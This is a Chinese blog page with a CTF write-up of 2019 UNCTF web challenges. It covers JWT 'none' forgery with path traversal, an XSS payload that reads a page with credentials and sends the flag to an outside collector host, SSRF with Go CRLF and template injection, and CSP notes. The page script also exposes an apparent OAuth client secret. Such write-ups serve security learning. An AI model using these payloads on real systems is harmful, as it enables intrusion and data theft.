@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="osword&#39;s blog">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      2019UNCTF 未解WEB复现填坑 | osword&#39;s blog
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/css/plugins/gitment.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+  
+    
+<script src="/js/gitment.js"></script>
+
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+<meta name="generator" content="Hexo 4.2.1"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>osword's blog</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/links/" class="item-link">Links</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/project/" class="item-link">Projects</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/links/" class="menu-link">Links</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/project/" class="menu-link">Projects</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>2019UNCTF 未解WEB复现填坑</h2>
+  <p class="post-date">2019-11-14 - 
+<span id="busuanzi_container_page_pv" style="color: #fff; margin-left: 0px">阅读量<span id="busuanzi_value_page_pv"></span>次
+        </span></p>
+<div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在复现这些未做出题目时候，感觉自己比赛时候还是不够细心，没有考虑出题人意图和其他漏洞点，看着是sql注入，就不去考虑其他漏洞利用方式。</p>
+<h1 id="Arbi"><a href="#Arbi" class="headerlink" title="Arbi"></a>Arbi</h1><p>登录注册界面</p>
+<p><img src="./1573556772013.png" alt="1573556772013"></p>
+<p>登录之后，服务端本地开启9000端口读取本地文件，路径依据注册的账号，可以便利目录读文件</p>
+<p><img src="./1573556758357.png" alt="1573556758357"></p>
+<p>Express框架，读取<strong><a href="http://127.0.0.1:9000/upload/../package.json?.jpg" target="_blank" rel="noopener">http://127.0.0.1:9000/upload/../package.json?.jpg</a></strong></p>
+<p><img src="./1573556592148.png" alt="1573556592148"></p>
+<p>后端使用jwt构造身份验证</p>
+<p><img src="./1573565534827.png" alt="1573565534827"></p>
+<ol>
+<li>利用express当传入algorithm为none，会使用algorithm none解密</li>
+<li><code>var secret = global.secretlist[id];</code> 传入不存在的id，使得secret为undefined</li>
+</ol>
+<p><img src="./1573565835641.png" alt="1573565835641"></p>
+<p>在login界面增加伪造token，并登录,进入admin后台，session.name=’admin’，就能够访问admin23333_interface.js</p>
+<p><img src="./1573566009065.png" alt="1573566009065"></p>
+<p><img src="./1573565975973.png" alt="1573565975973"></p>
+<p>admin23333_interface.js有个文件读取接口,参数可控</p>
+<p><img src="./1573566045820.png" alt="1573566045820"></p>
+<p>用到两个trick:</p>
+<ol>
+<li>传入a[b]=1 会转为a={“b”:1}构造为对象，正则匹配无法识别对象，爆warnnig绕过第一个if</li>
+<li>length不仅可以取字符串长度还可以取数组长度，把filename设数组，再配合下面的循环 即可完美绕过过滤 而express  中当碰到两个同名变量时，会把这个变量设置为数组，例如a=123&amp;a=456 解析后 a = [123,456]，所以最终组合成</li>
+</ol>
+<p><img src="./1573562632890.png" alt="1573562632890"></p>
+<p>payload:<code>&lt;http://183.129.189.60:10047/admin23333_interface?name[filename]=../&amp;name[filename]=f&amp;name[filename]=l&amp;name[filename]=a&amp;name[filename]=g&gt;</code></p>
+<p><img src="./1573566304858.png" alt="1573566304858"></p>
+<h1 id="easyXSS"><a href="#easyXSS" class="headerlink" title="easyXSS"></a>easyXSS</h1><p>测试xss</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">'123'</span> onerror=<span class="string">'alert(1)'</span> &gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="./1573567727736.png" alt="1573567727736"></p>
+<p><img src="./1573650330594.png" alt="1573650330594"></p>
+<p>Httponly限制了跨域请求，解决思路：开发者为了更好的支持跨域请求，引入了ajax。观察所有web界面ACL是否支持跨域请求且附带会附带cookie。其中最明显的是回显头显示允许X-Requests-with.</p>
+<p>最好利用的是<code>http://112.74.37.15:8010/index.php/treehole/view</code> 响应头ACL显示支持<code>X-Requests-with</code>且带cookie</p>
+<p><img src="./1573646018526.png" alt="1573646018526"></p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&#39;&#x2F;efefefe&#39; onerror&#x3D;&quot;xmlhttp&#x3D;new</span><br><span class="line">XMLHttpRequest();xmlhttp.withCredentials&#x3D;true;xmlhttp.onreadystatechange&#x3D;function()&#123;if(xmlhttp.readyState&#x3D;&#x3D;4)&#123;location.href&#x3D;&#39;http:&#x2F;&#x2F;xss.zhaoj.in&#x2F;?flag&#x3D;&#39;+</span><br><span class="line">xmlhttp.responseText.match(&#39;flag\\&#123;(.\*?)\\&#125;&#39;)[1]&#125;&#125;;xmlhttp.open(&#39;GET&#39;,&#39;&#x2F;index.php&#x2F;treehole&#x2F;view?id&#x3D;&#39;,true);xmlhttp.send(&#39;&#39;);&quot;&#x2F;\&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="./1573646485750.png" alt="1573646485750"></p>
+<h1 id="smile-doge"><a href="#smile-doge" class="headerlink" title="smile doge"></a>smile doge</h1><p>输入点存在ssrf,页面会嵌套<a href="http://127.0.0.1内容,再扫描端口发现9527也开放着" target="_blank" rel="noopener">http://127.0.0.1内容,再扫描端口发现9527也开放着</a></p>
+<p><img src="./1573650428706.png" alt="1573650428706"></p>
+<p>扫描目录存在源码泄露/backup/.index.php.swp,源码为golang</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Page <span class="keyword">struct</span>&#123;</span><br><span class="line">	Name <span class="keyword">string</span></span><br><span class="line">	Input <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Input <span class="keyword">struct</span>&#123;</span><br><span class="line">	MyName <span class="keyword">string</span></span><br><span class="line">	MyRequest *http.Request</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sayhelloName</span><span class="params">(w http.ResponseWriter,r *http.Request)</span></span>&#123;</span><br><span class="line">	w.Header().set(<span class="string">"X-Powered-By"</span>,<span class="string">"PHP/5.4.16"</span>)</span><br><span class="line">	<span class="keyword">var</span> out bytes.Buffer</span><br><span class="line">	<span class="keyword">var</span> response <span class="keyword">string</span></span><br><span class="line">	name := <span class="string">""</span></span><br><span class="line">	data,err := ioutil.ReadFile(<span class="string">"/flag"</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span>&#123;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">var</span> FLAG = <span class="keyword">string</span>(data)</span><br><span class="line">	r.ParseForm()</span><br><span class="line">	r.Header.Add(<span class="string">"FLAg"</span>, FLAG)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(r.Header[])&gt;<span class="number">0</span>&#123;</span><br><span class="line">		name = r.Header[<span class="string">"Logic"</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		name = <span class="string">"No.9527"</span></span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>解读代码下，毕竟第一次接触go语言</p>
+<p>开头定义两个结构体Page和Input，sayhelloName方法设置回显头和请求处理，重点关注flag位置，通过io流读取最后保存在FLAG变量中，最后会在请求时候带上。</p>
+<p>传入<a href="http://127.0.0.1:9527回显`No.9527`,以上文件是该端口的备份文件没跑了。">http://127.0.0.1:9527回显`No.9527`,以上文件是该端口的备份文件没跑了。</a></p>
+<p><img src="./1573660464066.png" alt="1573660464066"></p>
+<p>在看以下代码,另一个<code>r.Header[&quot;Logic&quot;][0]</code> 前端外带的数据为name值，如果此处可控，可以外带flag就完美了。</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(r.Header[])&gt;<span class="number">0</span>&#123;</span><br><span class="line">		name = r.Header[<span class="string">"Logic"</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		name = <span class="string">"No.9527"</span></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>r.Header[&quot;Logic&quot;][0]</code>为获取请求头的<code>Logic</code>键,通过ssrf直接请求<a href="http://127.0.0.1:9527无法设置请求头，考虑CRLF注入.这里正好使用http包">http://127.0.0.1:9527无法设置请求头，考虑CRLF注入.这里正好使用http包</a>.</p>
+<p><a href="https://github.com/golang/go/issues/30794" target="_blank" rel="noopener">https://github.com/golang/go/issues/30794</a></p>
+<p><img src="./1573661068540.png" alt="1573661068540"></p>
+<p>接下就是外带flag问题了，以上代码分析，flag是会被读取到http.Request中，而又存在一个可疑的结构体MyRequest对象,</p>
+<p>应该是调用该方法时候传入的对象.</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Input <span class="keyword">struct</span>&#123;</span><br><span class="line">	MyName <span class="keyword">string</span></span><br><span class="line">	MyRequest *http.Request</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接着利用模板注入，外带出FLAG</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:name&#x3D;http:&#x2F;&#x2F;127.0.0.1:9527&#x2F;? HTTP&#x2F;1.1\r\nLogic: &#123;&#123;.MyRequest&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="./1573661507668.png" alt="1573661507668"></p>
+<h1 id="superxss-待学习补充"><a href="#superxss-待学习补充" class="headerlink" title="superxss(待学习补充)"></a>superxss(待学习补充)</h1><p><img src="./1573662778533.png" alt="1573662778533"></p>
+<p>访问后可得如下CSP</p>
+<p>csp测试网站：<a href="https://csp-evaluator.withgoogle.com/" target="_blank" rel="noopener">https://csp-evaluator.withgoogle.com/</a></p>
+<p><code>default-src &#39;self&#39; 183.129.189.60</code> =&gt; 只允许源183.129.189.60获取数据</p>
+<p><code>script-src &#39;self&#39; &#39;unsafe-inline&#39;</code> =&gt;  允许使用内联 JavaScript 和 CSS。</p>
+<p><code>object-src &#39;none&#39;</code> =&gt; 可对 Flash 和其他插件进行控制 不执行任何匹配</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: <span class="keyword">default</span>-src <span class="string">'self'</span> <span class="number">183.129</span><span class="number">.189</span><span class="number">.60</span>;script-src <span class="string">'self'</span> <span class="string">'unsafe-inline'</span>;object-src <span class="string">'none'</span></span><br></pre></td></tr></table></figure>
+
+<p>过滤字符</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#39; &#x3D;&gt; &#96; 替代</span><br><span class="line">\过滤</span><br><span class="line">还过滤挺多事件onerror</span><br></pre></td></tr></table></figure>
+
+<p>wp给了个bypass xss/csp，但是后门exp就不会写了，扔个坑</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;frameset onpageshow =</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.ctfwp.com/articals/2019unctf.html" target="_blank" rel="noopener">https://www.ctfwp.com/articals/2019unctf.html</a></p>
+</section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#CTF" >
+    <span class="tag-code">CTF</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2019/11/12/2019%E6%B9%96%E6%B9%98%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">
+        <span class="nav-arrow">← </span>
+        
+          2019湖湘杯web部分题解
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/2019/11/16/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BThinkCMFX-%E4%B8%80/">
+        
+          历史漏洞分析之ThinkCMFX(一)
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+    <!-- 二维码 END -->
+    
+      <!-- Gitment START -->
+      <div id="comments"></div>
+      <!-- Gitment END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#前言"><span class="toc-nav-text">前言</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#Arbi"><span class="toc-nav-text">Arbi</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#easyXSS"><span class="toc-nav-text">easyXSS</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#smile-doge"><span class="toc-nav-text">smile doge</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#superxss-待学习补充"><span class="toc-nav-text">superxss(待学习补充)</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#参考链接"><span class="toc-nav-text">参考链接</span></a></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://zhzhdoai.github.io/2019/11/14/2019UNCTF-未解WEB复现填坑/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://file.muyutech.com/error-img.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://file.muyutech.com/error-img.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+
+
+  <script>
+    var gitmentConfig = "osword";
+    if (gitmentConfig !== 'undefined') {
+      var gitment = new Gitment({
+        id: "2019UNCTF 未解WEB复现填坑",
+        owner: "osword",
+        repo: "osword.github.io",
+        oauth: {
+          client_id: "7d7576c71632f14d639a",
+          client_secret: "3d7f7e4c0e9a43a2cc5334d68aee612090df8b70"
+        },
+        theme: {
+          render(state, instance) {
+            const container = document.createElement('div')
+            container.lang = "en-US"
+            container.className = 'gitment-container gitment-root-container'
+            container.appendChild(instance.renderHeader(state, instance))
+            container.appendChild(instance.renderEditor(state, instance))
+            container.appendChild(instance.renderComments(state, instance))
+            container.appendChild(instance.renderFooter(state, instance))
+            return container;
+          }
+        }
+      })
+      gitment.render(document.getElementById('comments'))
+    }
+  </script>
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<footer class="app-footer">
+  <p class="copyright">
+    &copy; 2020 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    Theme by <a href="https://github.com/yanm1ng" target="_blank" rel="noopener">yanm1ng</a>
+  </p>
+    访问量<span id="busuanzi_value_site_pv"></span>,
+    访客数<span id="busuanzi_value_site_uv"></span>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
